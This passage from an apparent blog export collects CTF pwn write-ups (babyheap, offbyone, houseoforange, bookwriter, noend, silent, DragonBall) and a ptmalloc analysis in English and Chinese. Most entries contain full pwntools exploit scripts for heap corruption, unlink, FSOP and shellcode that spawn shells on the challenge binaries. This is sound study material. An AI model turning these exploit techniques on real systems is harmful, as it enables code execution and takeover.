    <content type="text"><![CDATA[This pwn is a classic heap pwn. In its Edit() function exits a heap overflow of arbitrarily write. 1234567891011121314151617181920212223242526__int64 __fastcall Edit(__int64 List)&#123; __int64 Item; // rax int v2; // [rsp+18h] [rbp-8h] int len; // [rsp+1Ch] [rbp-4h] printf("Index: "); Item = InputNum(); v2 = Item; if ( (signed int)Item &gt;= 0 &amp;&amp; (signed int)Item &lt;= 15 ) &#123; Item = *(unsigned int *)(24LL * (signed int)Item + List); if ( (_DWORD)Item == 1 ) &#123; printf("Size: "); // overflow Item = InputNum(); len = Item; if ( (signed int)Item &gt; 0 ) &#123; printf("Content: "); Item = InputString(*(_QWORD *)(24LL * v2 + List + 16), len); &#125; &#125; &#125; return Item;&#125; Because the List(contains each block’s status, size and content’s pointer) is at random address, we cannot overflow and overwrite the List. So what I chose to do is to overflow the chunk to leak the libc information and perform fastbin attack. 1234567891011121314151617181920212223242526272829def pwn(): p = process('./babyheap') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' context.terminal = ['tmux', 'splitw', '-h'] one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147] gdb.attach(p, gdbscript='b *' + str(hex(0x555555554000 + 0x113d))) Add(p, 0x60) #0 Add(p, 0x60) #1 Add(p, 0x60) #2 Add(p, 0x60) #3 Add(p, 0x80) #4 Add(p, 0x80) #5 Add(p, 0x200 - 0x90 - 0x10) #6 Add(p, 0x80) #7 Add(p, 0x80) #8 Edit(p, 4, 'a' * 0x88 + p64(0x201)) Delete(p, 5) #5 Add(p, 0x80) #5 recv = Show(p, 6) libc_base_addr = u64(recv[0:8]) - 0x3c4b78 libc.address = libc_base_addr print hex(libc.symbols['__malloc_hook']) # chunk size 0x7f, ready for fastbin attack fake_chunk = libc.symbols['__malloc_hook'] - 0x10 - 3]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>0ctf</tag>
        <tag>2017</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[suCTF1 2018 pwn heap(offbyone) writeup]]></title>
    <url>%2F2018%2F07%2F07%2Fsuctf18-pwn-heap(offbyone)%2F</url>
    <content type="text"><![CDATA[Checksec： 12345Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000) This pwn exists off-by-one: When pwner wants to get a new chunk, the program will malloc() two same size chunk. The pwner’s input will be put into the first chunk, and then the program uses strcpy() without input size to do the memory copy. The first chunk will be free() very soon. 12345678910111213141516171819202122if ( size &gt; 0x7F &amp;&amp; size &lt;= 0x100 )&#123; fake_new_chunk = malloc(size); new_chunk = malloc(size); memset(new_chunk, 0, size); memset(fake_new_chunk, 0, size); puts("input your data"); read(0, fake_new_chunk, (unsigned int)size); strcpy((char *)new_chunk, (const char *)fake_new_chunk); ++total; for ( i = 0; i &lt; total; ++i ) &#123; if ( !heap_form[i] ) &#123; heap_form[i] = (char *)new_chunk; break; &#125; &#125; if ( i == total ) heap_form[i] = (char *)new_chunk; free(fake_new_chunk);&#125; If pwner doesn’t enter \x00 to end the string, the next chunk’s size will be regarded as a part of the string. Here exists off-by-one. We first malloc() 5 chunks, chunk 1-4 will reuse the first chunk’s fake_new_chunk to do the string copy. Chunk 1 will be used to get shell by system(). 1234567891011def pwn(): p = process('./offbyone') elf = ELF('./offbyone') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' # chunk size 0x80 ~ 0x100 Add(p, 0x100, '0' * 0x100) Add(p, 0x100, '/bin/sh\x00') Add(p, 0x100, '2' * 0x100) Add(p, 0x88, '3' * 0x88) Add(p, 0x100, '4' * 0x100) Construct a fake chunk of size 0x80 and set chunk 4 pre_inuse to 0 then perform the unlink attack. 123456payload = 2 * p64(0)payload += p64(0x6020d8 - 0x18) + p64(0x6020d8 - 0x10)payload = payload.ljust(0x80,'\x00')payload += p64(0x80) + '\x10'Edit(p, 3, payload)Delete(p, 4) When we free() the chunk 4, it will merge the fake chunk 3 of size 0x80 instead of 0x90. The unlink attack detail: 12345FD = 0x6020c0;BK = 0x6020c8;// will pass the security checkFD-&gt;bk = BK; // *(0x6020d8) = 0x6020c8BK-&gt;fd = FD; // *(0x6020d8) = 0x6020c0 After unlink, the chunk_list[3] will point to the chunk_list[0]’s address and we will have the ability to write and read arbitrarily. Then leak the libc address and get the shell by overwrite the free@got. 1234567891011Edit(p, 3, p64(elf.got['malloc']))libc_base_addr = Show(p, 0)libc_base_addr = u64(libc_base_addr.ljust(8, '\x00')) - libc.symbols['malloc']libc.address = libc_base_addrEdit(p, 3, p64(elf.got['free']))Edit(p, 0, p64(libc.symbols['system']))Delete(p, 1)p.interactive()p.close() Relevant Articlehttps://ctf-wiki.github.io/ctf-wiki/pwn/heap/unlink/]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>2018</tag>
        <tag>suctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hitcon 2016 houseoforange writeup]]></title>
    <url>%2F2018%2F07%2F03%2Fhitcon16-houseoforange%2F</url>
    <content type="text"><![CDATA[0x00 Program OverallThe program can Build(), Upgrade() and See() the house of orange. In Build(), the program first malloc a chunk of size 0x10 to store two address, one is color and price, and the other is the name. At the end of the Build(), a variable on bss will store the new house address and use it in Upgrade() and See(). We can use Upgrade() and See() to update and see the newest house. 12345678910111213141516171819202122232425262728293031323334353637int Build()&#123; //... if ( (unsigned int)COUNT &gt; 3 ) &#123; puts("Too many house"); exit(1); &#125; New_House = malloc(0x10uLL); printf("Length of name :"); size = InputNum(); if ( size &gt; 0x1000 ) size = 4096; *((_QWORD *)New_House + 1) = malloc(size); if ( !*((_QWORD *)New_House + 1) ) &#123; puts("Malloc error !!!"); exit(1); &#125; printf("Name :"); InputString(*((void **)New_House + 1), size); new_price = calloc(1uLL, 8uLL); printf("Price of Orange:", 8LL); *new_price = InputNum(); Show_Color(); printf("Color of Orange:"); Color_Num = InputNum(); //... if ( Color_Num == 56746 ) new_price[1] = 56746; else new_price[1] = Color_Num + 30; *(_QWORD *)New_House = new_price; Last_House = New_House; ++COUNT; return puts("Finish");&#125; 0x01 Program VulnerabilitiesWhen the program calls the Upgrade(), it allows user to give it the length of the name which leads to heap overflow: 123456789101112int Upgrade()&#123; //... printf("Length of name :"); v2 = InputNum(); if ( v2 &gt; 0x1000 ) v2 = 4096; printf("Name:"); InputString((void *)Last_House[1], v2); //... return puts("Finish");&#125; So, use unsorted bin attack and house of orange to get the shell. 0x02 Pwn!First we need to use heap overflow to trigger _int_free() in sysmalloc() to leak the libc address. 12345678910111213141516171819def pwn(): p = process('./houseoforange') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' Build(p, 0x80, 'sunichi1', 0x10, 1) # 1 # overflow the top chunk's size payload = 'B'*0x80 + p64(0) + p64(0x21) + p32(0x1) + p32(0x1f) + 2 * p64(0) + p64(0xf31) Upgrade(p, 0x100, payload, 0x10, 2) # 2 # trigger free in sysmalloc Build(p, 0x1000, 'sunichi2', 0x10, 3) # 3 # get the info of libc address Build(p, 0x400, 'x', 4, 4) # 0x400 = 1024 =&gt; large bin / still have some questions See(p) p.recvuntil('house : ') libc_addr = p.recv(6) libc_addr = u64(libc_addr.ljust(8, '\x00')) libc.address = libc_addr - 0x3c4b78 - 0x600 libc_base_addr = libc_addr - 0x3c4b78 - 0x600 Second, leak the heap address. 1234567# leak the heap addressUpgrade(p, 0x400, '1' * 0x10, 0x10, 5)See(p)p.recvuntil('1' * 0x10)heap_addr = p.recv(6)# address is the third house content address - 0x10heap_addr = u64(heap_addr.ljust(8, '\x00')) The final step is to construct the a chunk to perform unsorted bin attack and house of orange. 12345678910111213141516171819# unsorted bin attack and house of orangepayload = ''payload = payload.ljust(0x400, '\x00') + p64(0) + p64(0x21) + p64(0x2300000010) + p64(0)vtable = heap_addr + 0x410 + 0x20 + 0xc0 + 0x10 + 0x8 # point to vtable itself# change top chunk to 0x61 size and forge the streamfake_stream = '/bin/sh\x00' + p64(0x61) + p64(0) + p64(libc.symbols['_IO_list_all'] - 0x10) # here is heap + 0x410 + 0x20fake_stream = fake_stream.ljust(0xa0, '\x00')fake_stream += p64(heap_addr + 0x410 + 0x20 + 0xc0 + 0x10)fake_stream = fake_stream.ljust(0xc0, '\x00')fake_stream += p64(1) + 2 * p64(0) # here is heap + 0x410 + 0x20 + 0xc0fake_stream += p64(vtable)payload += fake_streampayload += p64(2)payload += p64(3)payload += p64(libc.symbols['system'])Upgrade(p, len(payload), payload, 0x10, 6) Call Build() to trigger malloc(0x10) and get shell. 1234p.recvuntil('Your choice : ')p.sendline('1')p.interactive()p.close() Relevant Articlehttps://sunichi.github.io/2018/07/02/pwnable-tw-bookwriter/ http://tacxingxing.com/2018/01/10/house-of-orange/ http://tacxingxing.com/2018/02/09/fsp/]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>heap</tag>
        <tag>hitcon</tag>
        <tag>2016</tag>
        <tag>house</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable tw bookwriter writeup]]></title>
    <url>%2F2018%2F07%2F02%2Fpwnable-tw-bookwriter%2F</url>
    <content type="text"><![CDATA[This pwn need to use Unsorted Bin Attack and House Of Orange to exploit. First, I would like to introduce Unsorted Bin Attack, House Of Orange and some relevant technique. 0x01 Unsorted Bin AttackEnvironment: I use 64 bit to make example. Condition: Control unsorted chunk’s bk pointer. Unsorted Bin uses FIFO strategy. Steps: Set free unsorted chunk’s pointer to target_addr - 0x10, this chunk will be the first free chunk in Unsorted Bin. Call malloc, the first free chunk will be put into the corresponding bin. Then the operations below will be performed: 1234victim = unsorted_bin(av)-&gt;bk = p;bck = victim-&gt;bk = target_addr - 0x10; // victim-&gt;bk is p-&gt;bkunsorted_bin(av)-&gt;bk = bck;bck-&gt;fd = unsorted_bin(av); // bck-&gt;fd is *(target_addr) So, use Unsorted Bin Attack can set target_addr’s value to main_arean+88. 0x02 FSOPFSOP(File-Stream Oriented Programming), like ROP and SROP, but it use FILE struct to construct the exploit chain. One of the use of FSOP is House Of Orange. FSOP mainly use _IO_ﬂush_all_lockp function, it flushes all standard I/O stream before process being terminated. It travels all FILE struct by element _chain pointer. The code: 123456789101112131415161718192021222324252627282930313233int _IO_flush_all_lockp (int do_lock)&#123; int result = 0; struct _IO_FILE *fp; int last_stamp; last_stamp = _IO_list_all_stamp; fp = (_IO_FILE *) _IO_list_all; while (fp != NULL) &#123; run_fp = fp; if (do_lock) _IO_flockfile (fp); if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) result = EOF; if (do_lock) _IO_funlockfile (fp); run_fp = NULL; if (last_stamp != _IO_list_all_stamp) &#123; /* Something was added to the list. Start all over again. */ fp = (_IO_FILE *) _IO_list_all; last_stamp = _IO_list_all_stamp; &#125; else fp = fp-&gt;_chain; // travel by _chain &#125; return result;&#125; According to the code above, _IO_flush_all_lockp which called by abort will call_IO_OVERFLOW (fp, EOF), and we can hijack 用_IO_OVERFLOW through FILE struct’s vtable. There are 3 situations that program will call abort: glibc abort exit function main return When there occurs some errors in malloc, it will call malloc_printerr and then malloc_printerr calls abort. This exploit makes advantage of changing _IO_list_all and forges vtable which includes _IO_OVERFLOW pointer. 1234567891011121314151617181920212223242526272829303132extern struct _IO_FILE_plus *_IO_list_all;struct _IO_FILE_plus&#123; FILE file; const struct _IO_jump_t *vtable;&#125;;typedef struct _IO_FILE FILE;struct _IO_jump_t&#123; JUMP_FIELD(size_t, __dummy); JUMP_FIELD(size_t, __dummy2); JUMP_FIELD(_IO_finish_t, __finish); JUMP_FIELD(_IO_overflow_t, __overflow); JUMP_FIELD(_IO_underflow_t, __underflow); JUMP_FIELD(_IO_underflow_t, __uflow); JUMP_FIELD(_IO_pbackfail_t, __pbackfail); /* ... */ JUMP_FIELD(_IO_xsputn_t, __xsputn); JUMP_FIELD(_IO_xsgetn_t, __xsgetn); JUMP_FIELD(_IO_seekoff_t, __seekoff); JUMP_FIELD(_IO_seekpos_t, __seekpos); JUMP_FIELD(_IO_setbuf_t, __setbuf); JUMP_FIELD(_IO_sync_t, __sync); JUMP_FIELD(_IO_doallocate_t, __doallocate); JUMP_FIELD(_IO_read_t, __read); JUMP_FIELD(_IO_write_t, __write); JUMP_FIELD(_IO_seek_t, __seek); JUMP_FIELD(_IO_close_t, __close); JUMP_FIELD(_IO_stat_t, __stat); JUMP_FIELD(_IO_showmanyc_t, __showmanyc); JUMP_FIELD(_IO_imbue_t, __imbue);&#125;; 0x03 Pwnable.tw bookwriterleak libc information and heap addressAt the beginning of the program, pwner needs to input the name of author on bss_0x602060 which behind the chunk_list(bss_0x6020A0). Pwner can input a string of length 0x40 without \x00, when program output the author’s name, the heap address leaks. In Edit() function, there are two lines of code following, in InputString() function, it doesn’t end up input string with \x00 which leads to larger string length. 12InputString((__int64)CHUNK_LIST[idx], SIZE_LIST[idx]);SIZE_LIST[idx] = strlen(CHUNK_LIST[idx]); The first part of expolit: 12345678910111213141516171819def pwn(): p = process('./bookwriter') libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') context.log_level = 'debug' p.recvuntil('Author :') # input auther name of length 0x40 without \x00 p.send('A' * 0x40) Add(p, 0x18, 'A' * 0x18) # 0 sleep(0.3) # extend size of chunk 0 Edit(p, 0, 'A' * 0x18) # overflow top chunk size and let its size to be 0xfe1 Edit(p, 0, '\x00' * 0x18 + '\xe1\x0f\0') # leak heap address by author name recv = Info(p, null, 0) heap_addr = u64(recv['old_author'][0x40:].ljust(8, '\x00')) - 0x10 print hex(heap_addr) But how to leak libc information while there is no free() in the program? When user malloc a chunk whose size is larger than top chunk, the program will call sysmalloc() and free the top chunk into unsorted bin. Then the top chunk fd and bk will point to the address which is relevant with main_arena. 12345678910# trigger free in sysmalloc, now the top chunk size is 0xfe1Add(p, 0x1000, 'sunichi') # 1 0x1000 &gt; 0xfe1Add(p, 0x40, 'sunichi!') # 2# leak libc addressrecv = View(p, 2)main_arena_88 = u64(recv[8:].ljust(8, '\x00'))libc_base_addr = main_arena_88 - 0x3c4b78 - (1640 - 88)system_addr = libc_base_addr + libc.symbols['system']io_list_all_addr = libc_base_addr + libc.symbols['_IO_list_all'] unsorted bin attack and perform house of orange to get the shellNow, we know the heap and libc address and the next step is to perform unsorted bin attack. First, construct a chunk of size 0x61. When it comes to malloc(1), the fake chunk will be put into fastbin[4]. Use unsorted bin attack, _IO_list_all will be changed to main_arena+88. After the fake chunk being put into fastbin[4], the malloc() will continue to find the next free unsorted chunk. Because next chunk’s size is 0, malloc() then triggers printerr(). So the program searches the FILE struct from _IO_list_all whose value is already main_arena+88 and calls FILE_OVERFLOW(). The first FILE struct is invalid, and through the main_arena+88-&gt;_chain(main_arena+216), the program will find the next FILE struct whose address is fastbin[4]’s first chunk which is forged by pwner. So the following code will be triggered: 1FILE_OVERFLOW(fp, EOF) =&gt; system(fp) =&gt; system('/bin/sh') The last part of exploits: 123456789101112131415161718192021222324252627# Index overflow, the size of chunk[0] will be changed to heap address for i in range(0x3, 0x9): Add(p, 0x20, str(i) * 0x20) vtable_addr = heap_addr + 0x248 payload = 0x170 * '\x00' fake_stream = '/bin/sh\x00' + p64(0x61) fake_stream += p64(0) + p64(io_list_all_addr - 0x10) # unsorted bin attack fake_stream = fake_stream.ljust(0xa0, '\x00') fake_stream += p64(heap_addr + 0x250) fake_stream = fake_stream.ljust(0xc0, '\x00') fake_stream += p64(1) + 2 * p64(0) + p64(vtable_addr) payload += fake_stream payload += p64(2) payload += p64(3) payload += p64(system_addr) Edit(p, 0, payload) p.recvuntil('Your choice :') p.sendline(str(1)) p.recvuntil('Size of page :') p.sendline(str(0x10)) p.interactive() Relevant Articlehttps://bbs.pediy.com/thread-223334.htm http://weaponx.site/2018/06/11/BookWriter-Writeup-pwnable-tw/ http://veritas501.space/2018/03/04/pwnable.tw%2011~18%E9%A2%98%20writeup/]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>pwnable-tw</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[suCTF 2018 pwn noend writeup]]></title>
    <url>%2F2018%2F06%2F15%2Fsuctf18-pwn-noend%2F</url>
    <content type="text"><![CDATA[保护措施：12345Arch: amd64-64-littleRELRO: Full RELROStack: No canary foundNX: NX enabledPIE: PIE enabled 使用IDA查看程序，发现此题所存在的漏洞。 12345678910111213141516while ( 1 )&#123; do &#123; memset(&amp;s, 0, 0x20uLL); read(0, &amp;s, 0x1FuLL); size = strtoll(&amp;s, 0LL, 10); buf = malloc(size); read(0, buf, size); *((_BYTE *)buf + size - 1) = 0; write(1, buf, (unsigned __int16)size); write(1, &amp;unk_B54, 1uLL); &#125; while ( size &gt; 127 ); free(buf);&#125; 在进行malloc时，并未检查是否malloc成功，malloc失败会返回0，导致后续存在任意地址写\x00的漏洞。首先需要泄漏libc的地址。 1234567891011121314151617181920def sar(p, size, content): p.sendline(str(size)) sleep(0.3) p.send(content) sleep(0.3) p.recvuntil(content)def pwn(): p = process('./noend') one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147] context.update(log_level='debug') sar(p, 0x20, 'sunichi') sar(p, 0x30, 'sunichi') sar(p, 0x7f, 'sunichi') sar(p, 0x20, 'A' * 8) recv = p.recvuntil('\n', drop=True) main_arena_addr = u64(recv[0:8]) libc_base_addr = main_arena_addr - 0x3c4b78 #malloc_hook = libc_base_addr + 0x3c4b10 free_hook = libc_base_addr + 0x3c67a8 根据free时，chunk合并的特性，能够使最后top chunk的fd和bk指向main_arena。malloc(0x20)后，其中的信息并不会清空，导致libc地址泄漏。 123p.sendline(str(main_arena_addr))sleep(0.3)p.clean() 申请一个非常大的chunk，使libc重新申请arena。使用前述同样的方法泄漏地址。 1234567sar(p, 0x20, 'sunichi')sar(p, 0x30, 'sunichi')sar(p, 0x7f, 'sunichi')sar(p, 0x20, 'A' * 8)recv = p.recvuntil('\n', drop=True)[0:8]top_chunk_ptr = u64(recv)top_chunk = u64(recv) + 0x888 泄漏的地址指向top chunk，在这使用硬编码计算伪造的top chunk与泄漏的地址的偏移。（本地没问题，不知道remote会不会有问题，等端午放完假再问问师傅） 12345sar(p, 0xf0, p64(libc_base_addr + one_gadget[3] + (free_hook - top_chunk - 0x10)) * (0xe8 / 8))p.sendline(str(top_chunk_ptr + 1))sleep(0.3)p.sendline()sleep(0.3) 接着对申请的chunk进行填充，填充的值为one_gadget_addr + (free_hook_addr - top_chunk_addr - 0x10)。继续申请一个很大的chunk，此时libc不会再有新的arena了，而是申请失败返回0，导致任意地址写入\x00。在这我们向指向top chunk的地址末位写入\x00，导致top chunk指针向前移动，指向了我们之前申请的chunk的content部分。此时，伪造top chunk完成。 1234p.sendline(str(free_hook - top_chunk - 0x10))sleep(0.3)p.sendline()sleep(0.3) malloc(free_hook - top_chunk - 0x10)，使得top chunk的size变为one_gadget_addr。同时top chunk的地址变为top_chunk_addr + free_hook - top_chunk - 0x10 = free_hook - 0x10，free_hook处被填入one_gadget_addr。随后获取shell。（注意地址对齐的问题） 123sar(p, 0x10, 'pwn')p.interactive()p.close()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
        <tag>suctf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ptmalloc malloc_consolidate分析]]></title>
    <url>%2F2018%2F06%2F04%2Fptmalloc-malloc_consolidate%2F</url>
    <content type="text"><![CDATA[尝试做了下suCTF2018的noend，用到的泄漏的libc地址的方法之前未遇到过，顺带对malloc_consolidate的源代码进行了学习。 以下分析基于glibc-2.23进行。 在free中，当达到某些条件的时候，会调用malloc_consolidate进行fastbin的chunk的合并。 首先，函数检查prev_chunk是否处于使用中，如果空闲，进行合并。 123456if (!prev_inuse(p)) &#123; prevsize = p-&gt;prev_size; size += prevsize; p = chunk_at_offset(p, -(long)prevsize); unlink(av, p, bck, fwd);&#125; 如果下一个chunk不是top_chunk，进行如下操作： 如果next_chunk空闲，合并next_chunk 如果next_chunk使用中，将next_chunk的prev_inuse位置为0 接着将本chunk放入unsorted bin中： 123first_unsorted = unsorted_bin-&gt;fd;unsorted_bin-&gt;fd = p;first_unsorted-&gt;bk = p; 如果本chunk不在small bin范围内，清空fd_nextsize和bk_nextsize。接着设置本chunk的属性： 1234set_head(p, size | PREV_INUSE);p-&gt;bk = unsorted_bin;p-&gt;fd = first_unsorted;set_foot(p, size); 如果下一个chunk是top_chunk，进行合并： 123size += nextsize;set_head(p, size | PREV_INUSE);av-&gt;top = p; 所以，当fastbin中有两个不同大小的chunk时，能使top chunk的bk和fd指向main_arena。]]></content>
      <tags>
        <tag>heap</tag>
        <tag>libc</tag>
        <tag>ptmalloc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[强网杯 2018 pwn silent2 writeup]]></title>
    <url>%2F2018%2F04%2F16%2Fqwb18-pwn-silent2%2F</url>
    <content type="text"><![CDATA[保护措施：12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 此题与silent几乎完全一致，仅是在malloc的时候做了大小限制： 123if ( size != 0x10 &amp;&amp; size &lt;= 127 ) exit(0);v3 = malloc(size); 因此此题需要依靠unsorted bin和unlink漏洞进行利用。首先申请5个chunk： 12345New(0x100, 'Hack by sunichi') # chunk_0New(0x100, 'Hack by sunichi') # chunk_1New(0x100, 'Hack by sunichi') # chunk_2New(0x100, 'Hack by sunichi') # chunk_3New(0x100, 'Hack by sunichi') # chunk_4 随后free chunk_3、chunk_4： 12Delete(3) # size 0x110Delete(4) # size 0x110 构造payload，0x6020c0为程序保存申请的chunk的地址的列表，首先我们要确保能通过unlink的安全检查，因此与0x6020c0有关的两个地址需要相差0x8，其次我们需要利用unlink改写列表中的值，进而写入got表地址然后进行覆写，unlink能达到的效果是对目标地址（第3个p64）+0x18的位置上写入其自身，我们在这就可以将list[3]的值替换为list[0]的地址，因此第三个p64的地址为target_addr - 0x18。填充完后，伪造chunk，prev_size为0x100，size为0x100： 12payload = p64(0) + p64(0x101) + p64(0x6020c0 + 0x18 - 0x18) + p64(0x6020c0 + 0x18 - 0x10) + 'A' * (0x100 - 0x20) + p64(0x100) + p64(0x110)New(0x210, payload) # chunk_5 Double Free并且通过编辑chunk_3将list[0]改写为free@got，然后将system@plt写入free@got： 123Delete(4)Edit(3, p64(elf.got['free']))Edit(0, p64(elf.plt['system'])) 拿到shell： 1234New(0x100, '/bin/sh\x00') # chunk_6Delete(6) # Get shellp.interactive()p.close()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
        <tag>qwb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[强网杯 2018 pwn silent writeup]]></title>
    <url>%2F2018%2F04%2F15%2Fqwb18-pwn-silent%2F</url>
    <content type="text"><![CDATA[保护措施：12345Arch: amd64-64-littleRELRO: Partial RELROStack: Canary foundNX: NX enabledPIE: No PIE (0x400000) 使用IDA查看程序，发现此题存在Double Free，可以进行fastbin attack，并修改free@got的地址为system后获取shell。 该题一开始会执行下列指令： 1system("cat banner.txt"); 使用gdb进行调试的时候这里有一个坑（不过在这里调用了一次system应该是方便了后面的漏洞利用），gdb默认会去调试子进程，导致无法继续调试主进程，因此需要设置gdb： 1set follow-fork-mode parent 首先申请3个fastbin chunk： 123New(0x50, 'Hack by sunichi') # chunk_0New(0x50, 'Hack by sunichi') # chunk_1New(0x50, '/bin/sh\x00') # chunk_2 为什么要选取0x50作为chunk的大小？因为在got表起始地址附近，能作为fastbin chunk的size的数据只有0x602002处的0xe168000000000060。malloc函数被调用时，会使用unsigned int对size做类型转换，在这里size就被转换成了0x60，与我们申请的0x50（content）+0x10（chunk头）大小的chunk一致。 随后进行fastbin attack： 123Delete(0)Delete(1)Delete(0) 三次释放后，header -&gt; 0 -&gt; 1 -&gt; 0 -&gt; 0x00。接着我们申请fastbin chunk： 1234567New(0x50, p64(0x601ffa)) # 0x602002 - 8# header -&gt; 1 -&gt; 0 -&gt; 0x601ffaNew(0x50, 'Hack by sunichi')# header -&gt; 0 -&gt; 0x601ffaNew(0x50, 'Hack by sunichi')# header -&gt; 0x601ffaNew(0x50, 'A' * 14 + p64(elf.plt['system'])) # Overwrite free@got 接着调用system函数，由于我们第1次申请的chunk_2的content中为字符串/bin/sh，因此此时调用free(chunk_2)等于system(‘/bin/sh’)： 123Delete(2)p.interactive()p.close()]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
        <tag>qwb</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hitctf 2018 pwn250 DragonBall writeup]]></title>
    <url>%2F2018%2F04%2F12%2Fhitctf18-pwn250%2F</url>
    <content type="text"><![CDATA[此题的漏洞主要是在第4个选项，即wish函数中，在里面有栈溢出漏洞，能够利用栈溢出返回到任意地址中。用ida查看程序，需要集齐7龙珠才能许愿。初始有15元，购买1个龙珠5元，出售1个龙珠3元，在购买时进行下述检查： 1234if ( !money ) return puts("You don't have enough money.");money -= 5;++dragon_ball_num; 只要金钱不为0，就可以一直购买，因此先购买1个龙珠、卖出1个龙珠，然后再连续购买7个龙珠即可。 1234buy()sell()for i in range(0, 7): buy() 保护措施如下： 123456Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX disabledPIE: No PIE (0x8048000)RWX: Has RWX segments 因此我们可以让程序返回到栈上去执行我们注入的shellcode。使用pattern获取返回值的偏移，为0xa4。wish函数中，两次输入长度分别为0x64和0x40，使用pwntool生成shellcode： 1asm(shellcraft.i386.linux.sh()) shellcode长度为44，两次输入有部分区域重叠，非重叠区域为0x68-0x38=48，刚好能够容纳得下shellcode，shellcode能完整的写入。为了使函数能够返回到栈上，我们需要泄漏栈地址信息。 1234567891011121314int wish()&#123; char v1; // [esp+0h] [ebp-68h] int v2; // [esp+30h] [ebp-38h] memset(&amp;v1, 0, 0x60u); if ( dragon_ball_num != 7 ) return puts("You can't make a wish."); printf("Tell me your wish: "); read_input_raw(&amp;v1, 0x68); printf("Your wish is %s, is it right?\n(Y/N) ", &amp;v1); read_input_raw(&amp;v2, 0x40); return puts("OK.");&#125; 第一次输入的0x68长度的字符串后正好是ebp地址，因此写入长为0x68的字符串即可让printf函数打印出ebp信息： 123456p.recvuntil('choice: ')p.sendline('4')payload = 'A' * 0x68p.sendline(payload)p.recvuntil(payload)ebp = u32(p.recv(4)) 获取栈信息后构造新的payload拿shell： 12345678p.recvuntil('choice: ')p.sendline('4')execve_sh = asm(shellcraft.i386.linux.sh())payload = execve_sh + 'A' * (0xa4 - len(execve_sh)) + p32(ebp - 0x88)p.sendline(payload)p.interactive()p.close() 0x88为main函数到shellcode的偏移，因为wish函数栈大小为0x68，main函数为0x20，因此此处为0x88。]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[hitctf 2018 pwn100&pwn200 writeup]]></title>
    <url>%2F2018%2F04%2F12%2Fhitctf18-pwn100%26pwn200%2F</url>
    <content type="text"><![CDATA[0x00 pwn100保护措施： 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) pwn100为简单的栈溢出： 123456789int vuln()&#123; char buf; // [esp+0h] [ebp-28h] puts("Welcome to pwn world!\nLeave your name:"); fflush(stdout); read(0, &amp;buf, 64u); // StackOverflow Here 64 -&gt; 40 return puts("bye~");&#125; 只要将vuln函数的返回地址覆盖掉即可，使其返回到flag函数中，同时还需要构造flag函数的参数： 123456789int __cdecl flag(int a1, int a2)&#123; if ( a1 != 0xDEADBEEF ) CheckFailed(); command = "cat flag"; if ( a2 != 0xC0FFEE ) CheckFailed(); return system(command);&#125; payload构造如下： 1payload = 'A' * 44 + p32(flag_addr) + p32(0xdeadbeef) + p32(0xdeadbeef) + p32(0xc0ffee) 0x01 pwn200保护措施 12345Arch: i386-32-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x8048000) 该程序先进行登录，再进行验证，验证通过后获得flag： 12345678910111213141516171819202122232425262728293031323334353637383940414243signed int login()&#123; signed int v1; // [esp+4h] [ebp-14h] int n; // [esp+8h] [ebp-10h] int v3; // [esp+Ch] [ebp-Ch] v1 = 255; printf("Username: "); n = read_input_raw((int)bss_username, 16); printf("Password: "); v3 = read_input_raw((int)bss_password, 32); if ( !strncmp(bss_username, "root", n) &amp;&amp; !strncmp(bss_password, "passwd_has_be_changed_in_remote_", v3) ) return 0; if ( !strncmp(bss_username, "lilac", n) &amp;&amp; !strncmp(bss_password, "a_password_you_know_uh_huh_^_^@!", v3) ) v1 = 16; return v1;&#125;signed int check()&#123; signed int v1; // [esp+Ch] [ebp-Ch] v1 = 0; if ( !strncmp(bss_username, "root", 4u) ) &#123; puts("Correct username!"); v1 = 1; &#125; else &#123; puts("Incorrect username!"); &#125; if ( !strncmp(bss_password, "passwd_has_be_changed_in_remote_", 32u) ) &#123; puts("Correct password!"); ++v1; &#125; else &#123; puts("Incorrect password!"); &#125; return v1;&#125; 可以看出，在login函数中，只对用户输入的长度的数据进行字符串比较；而在check函数中，则对整个0x20长的字符串进行比较。从这也可以看出实际的密码长度为0x20。因此此题进行32长度的字符串逐位爆破即可。]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>ctf</tag>
        <tag>2018</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cyberearth xctf pwn stack writeup]]></title>
